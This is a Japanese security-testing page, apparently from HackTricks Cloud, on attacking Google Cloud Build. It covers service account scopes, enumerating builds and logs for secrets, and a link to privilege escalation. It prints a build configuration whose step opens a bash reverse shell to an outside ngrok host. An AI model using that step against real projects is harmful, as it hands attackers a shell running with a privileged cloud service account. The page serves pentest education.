# GCP - Cloud Build

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社の広告を見たい**場合や、**最新バージョンのPEASSやHackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見する
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **ハッキングのトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>

## 基本情報

Google Cloud Buildは、**ソフトウェアのビルド**とリリースプロセスを自動化する**管理型CI/CDプラットフォーム**であり、**ソースコードリポジトリ**と統合し、さまざまなプログラミング言語をサポートしています。開発者は、コードを**自動的にビルド、テスト、デプロイ**することができます。また、ビルドステップとワークフローをカスタマイズする柔軟性も提供しています。

各Cloud Buildトリガーは、Cloudリポジトリに関連付けられているか、外部リポジトリ（Github、Bitbucket、Gitlab）と直接接続されています。

Cloud Buildは、ビルドの実行に**承認が必要な場合があります**（デフォルトでは無効）。

**サービスアカウントには`cloud-platform`スコープがあり**、すべての特権を使用することができます。**SAが指定されていない場合**（submit時など）、**デフォルトのSA** `<proj-number>@cloudbuild.gserviceaccount.com`が**使用されます**。

{% hint style="success" %}
ここからまたはCloudリポジトリからGithub/Bitbucketトークンを盗む方法は見つかりませんでした。リポジトリがダウンロードされると、[https://source.cloud.google.com/](https://source.cloud.google.com/)のURLを介してアクセスされ、クライアントからはGithubにアクセスされません。
{% endhint %}

### ストレージ

Cloud Buildは、トリガーのファイルを保存するために**新しいストレージを生成することがあります**。これは、GCPが提供する例で発生します。
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
### シェルを取得する
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
### 列挙

ビルドの設定とログには、**機密情報が含まれている可能性があります**。
```bash
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs
```
## 特権昇格

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

<details>

<summary><strong>HackTricksをサポートして特典を得る！</strong></summary>

* **HackTricksで会社を宣伝したい**場合や、**PEASSの最新バージョンを入手したい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見する
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私をフォローする🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有する**ために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>
